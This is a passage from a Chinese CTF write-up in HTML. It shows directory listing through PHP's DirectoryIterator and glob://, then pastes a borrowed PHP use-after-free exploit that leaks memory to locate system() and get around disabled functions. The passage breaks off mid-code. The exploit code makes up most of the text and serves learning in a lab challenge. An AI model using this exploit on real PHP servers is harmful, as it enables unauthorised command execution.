class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>DirectoryIterator:The DirectoryIterator class provides a simple interface for viewing the contents of filesystem directories.这个类的作用是提供了查看文件目录下文件的接口，简单来说就是为遍历目录提供了方便的类，外部调用DirectoryIterator时，传入一个目录路径字符串，实例化DirectoryIterator类。再用foreach或者while遍历目录</p></li><li><p>glob:// — 查找匹配的文件路径模式</p></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><span class="token comment">// 并打印文件名和文件尺寸</span><span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob://ext/spl/examples/*.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%s: %.1FK\n"</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token operator">-></span><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token operator">-></span><span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一个例子，这了的glob:///*的意思是循环根目录下的所有文件，</p><ul><li>foreach：提供了遍历数组的简单方式。foreach仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。</li></ul><pre class="line-numbers language-none"><code class="language-none">foreach (iterable_expression as $value)    statement这种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 $value。也就是这道题的格式了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>执行payload后可以看到flag0.txt</p><p><img src="/images/image-20210128171348202.png"></p><p>尝试include，</p><p><img src="/images/image-20210128172312991.png"></p><p>失败，不会了，给出大佬们的exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>             <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token 